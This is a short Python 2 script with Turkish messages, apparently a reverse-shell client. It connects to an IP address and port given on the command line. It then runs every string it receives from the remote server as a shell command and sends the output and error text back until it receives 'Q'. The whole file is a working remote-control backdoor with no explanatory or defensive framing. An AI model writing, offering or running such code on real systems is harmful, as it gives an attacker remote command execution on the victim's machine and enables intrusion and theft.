import socket
import subprocess
import sys
try:
	po = sys.argv[2]
	p = int(po)
except:
	print "Lutfen tam sayi giriniz..."
	exit()
try:
	ip = sys.argv[1]
except:
	print "usage : python client.py <ip_adress> <port>"
	exit()
ag = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	ag.connect((ip, p))
except:
	print "baglanmadi..!"
	exit()

print "Data :", ag.recv(1024)


while True:
	tro = ag.recv(1024)
	if tro == "Q":
		ag.close()
		break
	else:
		CMD = subprocess.Popen(tro, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
		ag.send(CMD.stdout.read())
		ag.send(CMD.stderr.read())
